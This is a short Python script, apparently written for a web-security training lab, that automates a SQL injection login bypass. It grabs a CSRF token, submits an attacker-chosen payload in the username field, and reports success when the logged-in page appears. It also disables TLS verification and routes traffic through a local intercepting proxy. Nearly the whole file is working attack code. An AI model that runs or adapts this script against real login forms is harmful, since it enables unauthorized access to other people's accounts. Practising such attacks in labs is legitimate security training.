import sys
import requests
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} 

def get_csrf_token(sess,url):
    req=sess.get(url, verify=False, proxies=proxies)
    token=BeautifulSoup(req.text, 'html.parser')
    csrf=token.find("input")['value']
    print(f"CSRF: {csrf}")
    return csrf

def exploit_sqli(sess, url,payload):
    csrf=get_csrf_token(sess,url)
    form_data={
        "csrf" : csrf,
        "username" : payload,
        "password" : "anything"
    }
    res = sess.post(url, data=form_data, verify=False, proxies=proxies)
    if "Update email" in res.text:
        return True
    else:
        return False
    
if __name__=="__main__":
    try:
        url= sys.argv[1].strip()
        payload=sys.argv[2].strip()
    except IndexError:
        print(f"[ - ] Usage: {sys.argv[0]} <URL> <Payload>")
    
    sess = requests.Session()
    if exploit_sqli(sess, url, payload):
        print("Successful")
    else:
        print("Unsuccessful")